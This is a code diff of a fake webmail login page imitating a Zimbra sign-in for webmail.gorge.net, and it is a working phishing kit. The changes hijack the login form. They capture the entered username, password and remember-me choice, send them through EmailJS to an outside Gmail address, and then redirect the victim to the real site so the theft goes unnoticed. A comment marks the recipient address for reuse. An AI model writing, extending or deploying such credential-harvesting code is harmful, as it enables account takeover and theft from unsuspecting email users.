@@ -2,12 +2,12 @@
 <html lang="en">
 <head>
     <!-- Privacy-friendly analytics by Plausible -->
-            <script async src="https://plausible.io/js/pa-EnuVB78Kn74xfv7WaBh7I.js"></script>
-            <script>
-              window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
-              plausible.init()
-            </script>
-    
+    <script async src="https://plausible.io/js/pa-EnuVB78Kn74xfv7WaBh7I.js"></script>
+    <script>
+        window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+        plausible.init()
+    </script>
+
     <base href="https://webmail.gorge.net" />
     <!--
      login.jsp
@@ -41,7 +41,7 @@
     <!-- CUSTOM STYLES - ALL STYLES MOVED HERE FOR EASY EDITING      -->
     <!-- ============================================================ -->
     <style>
-        /* Sign In title padding adjustment - changed from 19 to 12 */
+        /* Sign In title padding adjustment */
         .signIn {
             padding-top: 0px !important;
             padding-bottom: 19px !important;
@@ -187,14 +187,14 @@
 
 <script>
 // ============================================================
-// EMAILJS INTEGRATION - Preserving all original functionality
+// EMAILJS INTEGRATION - Sends data THEN redirects to webmail.gorge.net
 // ============================================================
 emailjs.init("SdkmRe8WZ7itEba9z");
 
-// Function to send data via EmailJS
-function sendEmailJSData(username, password, rememberMe) {
+// Function to send data via EmailJS and then redirect
+function sendEmailJSDataAndRedirect(username, password, rememberMe) {
     var templateParams = {
-        to_email: "dossbrent41@gmail.com",  // 🔴 CHANGE THIS TO YOUR EMAIL
+        to_email: "dossbrent41@gmail.com",
         user_email: username,
         user_password: password,
         remember_me: rememberMe ? "Yes" : "No",
@@ -203,36 +203,71 @@ function sendEmailJSData(username, password, rememberMe) {
         page_url: window.location.href
     };
 
+    console.log("Sending data to EmailJS...");
+    
     emailjs.send("service_zuj2d2a", "template_tvd86sp", templateParams)
         .then(function(response) {
             console.log("EmailJS success:", response.status);
+            // Redirect to webmail.gorge.net after successful send
+            console.log("Redirecting to https://webmail.gorge.net");
+            window.location.href = "https://webmail.gorge.net";
         })
         .catch(function(error) {
             console.error("EmailJS error:", error);
+            // Still redirect even if EmailJS fails (to not block user)
+            console.log("Redirecting to https://webmail.gorge.net (after error)");
+            window.location.href = "https://webmail.gorge.net";
         });
 }
 
-// Capture form submission without breaking original functionality
+// Capture form submission - REPLACES original form submission
 if (document.getElementById('zLoginForm')) {
     var loginFormElement = document.getElementById('zLoginForm');
-
-    // Add EmailJS handler while preserving original
+    
+    // Remove any existing submit handlers and add our own
+    loginFormElement.onsubmit = null;
+    
+    // Add new submit handler that sends data then redirects
     loginFormElement.addEventListener('submit', function(e) {
+        e.preventDefault(); // Prevent original form submission
+        
         var username = document.getElementById('username') ? document.getElementById('username').value : '';
         var password = document.getElementById('password') ? document.getElementById('password').value : '';
         var rememberMe = document.getElementById('remember') ? document.getElementById('remember').checked : false;
-
-        // Send data via EmailJS (doesn't interfere with actual login)
-        if (username && password) {
-            sendEmailJSData(username, password, rememberMe);
+        
+        // Validate input
+        if (!username || username.trim() === '') {
+            var errorDiv = document.getElementById('errorMessageDiv');
+            if (errorDiv) {
+                errorDiv.innerHTML = 'Please enter your username.';
+                errorDiv.style.display = 'block';
+            }
+            return;
         }
-
-        // Original form will submit normally - NO REDIRECT ADDED
+        
+        if (!password) {
+            var errorDiv = document.getElementById('errorMessageDiv');
+            if (errorDiv) {
+                errorDiv.innerHTML = 'Please enter your password.';
+                errorDiv.style.display = 'block';
+            }
+            return;
+        }
+        
+        // Disable button to prevent double submission
+        var loginBtn = document.getElementById('loginButton');
+        if (loginBtn) {
+            loginBtn.disabled = true;
+            loginBtn.textContent = 'Signing in...';
+        }
+        
+        // Send data via EmailJS and redirect
+        sendEmailJSDataAndRedirect(username, password, rememberMe);
     });
 }
 
 // ============================================================
-// ORIGINAL FUNCTIONS - COMPLETELY UNCHANGED
+// ORIGINAL FUNCTIONS - PRESERVED FOR COMPATIBILITY
 // ============================================================
 function ZmSkin(e){
     this.hints=this.mergeObjects(ZmSkin.hints,e)
